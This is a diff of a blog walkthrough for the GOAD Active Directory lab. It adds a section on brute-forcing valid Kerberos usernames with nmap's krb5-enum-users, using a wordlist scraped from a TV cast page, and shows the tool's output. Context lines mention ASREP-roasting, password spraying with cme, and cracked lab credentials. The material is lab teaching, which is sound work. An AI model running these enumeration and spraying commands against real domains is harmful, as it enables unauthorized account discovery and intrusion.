@@ -5,6 +5,10 @@ category : AD
 tags :  AD, Lab, cme, enum4linux
 ---
 
+We have done some basic reconnaissance on [part1](/posts/GOADv2-pwning_part2/), now we will try to enumerate users and start to hunt for credentials.
+
+![find_users](/assets/blog/GOAD/mindmap_find_users.png)
+
 ## Enumerate DC's anonymous
 
 ### With CME
@@ -103,9 +107,170 @@ NORTH\jeor.mormont
 NORTH\sql_svc
 ```
 
-## ASREP - roasting
+## Enumerate DC's anonymous - when anonymous sessions are not allowed
 
-- We create a users.txt file with all the user name previously found:
+The Winterfell domain controler allow anonymous connection, this is the reason why we can list the domain users and groups.
+But nowadays that kind of configuration almost never append. (On the opposite password in users description append quite often x) ).
+
+We can still enumerate valid users by bruteforcing them.
+
+- First let's create a user list:
+```bash
+curl -s https://www.hbo.com/game-of-thrones/cast-and-crew | grep 'href="/game-of-thrones/cast-and-crew/'| grep -o 'aria-label="[^"]*"' | cut -d '"' -f 2 | awk '{if($2 == "") {print tolower($1)} else {print tolower($1) "." tolower($2);} }' > got_users.txt
+```
+
+- We get the following list:
+```
+robert.baratheon
+tyrion.lannister
+cersei.lannister
+catelyn.stark
+jaime.lannister
+daenerys.targaryen
+viserys.targaryen
+jon.snow
+robb.stark
+sansa.stark
+arya.stark
+bran.stark
+rickon.stark
+joffrey.baratheon
+jorah.mormont
+theon.greyjoy
+samwell.tarly
+renly.baratheon
+ros
+jeor.mormont
+gendry
+lysa.arryn
+robin.arryn
+bronn
+grand.maester
+varys
+loras.tyrell
+shae
+benjen.stark
+barristan.selmy
+khal.drogo
+hodor
+lancel.lannister
+maester.luwin
+alliser.thorne
+osha
+maester.aemon
+talisa.stark
+brienne.of
+davos.seaworth
+tywin.lannister
+stannis.baratheon
+margaery.tyrell
+ygritte
+balon.greyjoy
+roose.bolton
+gilly
+podrick.payne
+melisandre
+yara.greyjoy
+jaqen.h’ghar
+grey.worm
+beric.dondarrion
+missandei
+mance.rayder
+tormund
+ramsay.snow
+olenna.tyrell
+thoros.of
+orell
+qyburn
+brynden.tully
+tommen.baratheon
+daario.naharis
+oberyn.martell
+myrcella.baratheon
+obara.sand
+nym.sand
+tyene.sand
+high.sparrow
+trystane.martell
+doran.martell
+euron.greyjoy
+lady.crane
+high.priestess
+randyll.tarly
+izembaro
+brother.ray
+archmaester.ebrose
+```
+
+- Let's try this list on meereen.essos.local domain controler and kingslanding.sevenkingdoms.local
+
+```bash
+nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='sevenkingdoms.local',userdb=got_users.txt" 192.168.56.10
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 22:13 CEST
+Nmap scan report for sevenkingdoms.local (192.168.56.10)
+Host is up (0.00028s latency).
+
+PORT   STATE SERVICE
+88/tcp open  kerberos-sec
+| krb5-enum-users: 
+| Discovered Kerberos principals
+|     robert.baratheon@sevenkingdoms.local
+|     joffrey.baratheon@sevenkingdoms.local
+|     renly.baratheon@sevenkingdoms.local
+|     jaime.lannister@sevenkingdoms.local
+|     tywin.lannister@sevenkingdoms.local
+|     cersei.lannister@sevenkingdoms.local
+|_    stannis.baratheon@sevenkingdoms.local
+MAC Address: 08:00:27:57:A4:F2 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds
+```
+
+- Great we found 7 valid users on sevenkingdoms.local!
+
+```bash
+nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='essos.local',userdb=got_users.txt" 192.168.56.12
+```
+
+```
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 22:14 CEST
+Nmap scan report for essos.local (192.168.56.12)
+Host is up (0.00036s latency).
+
+PORT   STATE SERVICE
+88/tcp open  kerberos-sec
+| krb5-enum-users: 
+| Discovered Kerberos principals
+|     viserys.targaryen@essos.local
+|     daenerys.targaryen@essos.local
+|     khal.drogo@essos.local
+|_    jorah.mormont@essos.local
+MAC Address: 08:00:27:33:DF:2F (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds
+```
+
+- And we found 4 valid users on sevenkingdoms.local
+
+- As we can see on the [nmap page](https://nmap.org/nsedoc/scripts/krb5-enum-users.html) :
+
+    Discovers valid usernames by brute force querying likely usernames against a Kerberos service. When an invalid username is requested the server will respond using the Kerberos error code KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN, allowing us to determine that the user name was invalid. Valid user names will illicit either the TGT in a AS-REP response or the error KRB5KDC_ERR_PREAUTH_REQUIRED, signaling that the user is required to perform pre authentication.
+
+- In summary, the badpwdcount will not be increased when you bruteforce users.
+- Let's verify it :
+
+![cme_users_essos.png](/assets/blog/GOAD/cme_users_essos.png)
+
+
+## User but no credentials
+
+We got users now try to get password for them.
+
+![mindmap_user_nopass.png](/assets/blog/GOAD/mindmap_user_nopass.png)
+
+### ASREP - roasting
+
+- We create a users.txt file with all the user name previously found on north.sevenkingdoms.local:
 
 ```
 sql_svc
@@ -195,7 +360,7 @@ Hardware.Mon.#1..: Temp: 78c Util: 80%
     - samwell.tarly:Heartsbane
     - brandon.stark:iseedeadpeople
 
-## Password Spray
+### Password Spray
 
 - We could try the classic user=password test 
 
@@ -231,3 +396,5 @@ cme smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.1
     - samwell.tarly:Heartsbane (user description)
     - brandon.stark:iseedeadpeople (asreproasting)
     - hodor:hodor (password spray)
+
+- Great, in the next part we will start to dig what to do with a valid user.
